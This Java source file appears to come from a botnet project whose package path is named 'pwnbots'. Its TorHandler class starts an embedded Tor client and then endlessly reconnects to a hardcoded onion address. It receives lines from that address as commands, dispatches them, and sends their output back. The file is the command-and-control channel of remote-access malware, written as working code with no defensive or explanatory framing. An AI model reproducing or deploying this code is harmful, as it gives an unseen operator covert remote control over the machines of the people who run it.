package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.tor.handler;

import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.ControlEvent;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.command.CommandEvent;
import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
import com.google.common.eventbus.Subscribe;
import com.subgraph.orchid.TorClient;
import com.subgraph.orchid.TorInitializationListener;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketTimeoutException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TorHandler implements TorInitializationListener {

    Logger logger = LoggerFactory.getLogger(getClass());

    TorClient torClient;
    private PrintWriter writer;
    private BufferedReader reader;

    public void register() {
        CommonHeader.getEVENT_HEADER().getTorEventBus().register(this);
    }

    //FIXME
    @Subscribe
    void controlEventPoint(ControlEvent event) {
        ControlEvent controlEvent = (ControlEvent) event;
        ControlEvent.CONTROL_TYPE type = controlEvent.getType();
        switch (type) {
            case INIT:
                init();
                break;
            case START:
                    try {
                start();
            } catch (Exception e) {
                logger.error("", e);
            }
            break;
            default:
                break;
        }

    }

    private void init() {
        this.torClient = new TorClient();
        torClient.addInitializationListener(this);
        torClient.enableSocksListener(9000);
    }

    private void start() {
        torClient.start();
    }

    @Override
    public void initializationProgress(String string, int i) {
        string.getClass();
    }

    @Override
    public void initializationCompleted() {
        do {
            try {
                Socket socket = torClient.getSocketFactory().createSocket("pbc6urv4bakvxkjs.onion", 8000);

                this.writer = new PrintWriter(socket.getOutputStream(), true);
                this.reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                writer.println("CONNECTED");
                String line;
                while ((line = reader.readLine()) != null) {
                    CommandEvent commandEvent = new CommandEvent();
                    commandEvent.setCommand(line);
                    CommonHeader.getEVENT_HEADER().getCommandEventBus().post(commandEvent);
                }
                socket.close();
            } catch (java.net.ConnectException | SocketTimeoutException e) {
                e.getClass();//IGNORE
            } catch (Exception ex) {
                logger.error(null, ex);
            }
            if (CommonHeader.debug) {
                logger.info("reconnect");
            }
        } while (true);

    }

    @Subscribe
    void
            sendOutPutFromCommand(CommandEvent event
            ) {
        try {
            String output = event.getOutput();
            writer.println(output);
            writer.flush();
        } catch (NullPointerException npe) {
            npe.getClass();//IGNORE
        } catch (Exception e) {
            logger.error("", e);
        }
    }
}
